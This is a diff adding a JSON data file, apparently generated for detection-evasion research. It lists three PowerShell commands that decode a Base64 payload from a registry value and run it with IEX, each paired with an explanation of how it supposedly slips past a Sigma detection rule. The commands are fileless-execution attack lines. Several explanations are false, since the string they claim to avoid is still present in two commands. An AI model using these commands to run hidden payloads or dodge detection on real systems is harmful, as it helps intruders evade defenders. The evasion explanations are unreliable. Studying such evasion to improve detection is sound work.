@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\"",
+    "explanation": "Reordering: The command reorders the arguments to avoid the suspicious string '::FromBase64String(' by using a different syntax that still performs the same action but is parsed differently."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\"",
+    "explanation": "Substitution: Replaced the suspicious string with a different method that still performs the same action but uses a different syntax to avoid the Sigma rule's string match."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" -EncodedCommand",
+    "explanation": "Insertion: Inserted an additional parameter that does not affect the command's execution but changes the parsing to avoid the Sigma rule's string match."
+  }
+]
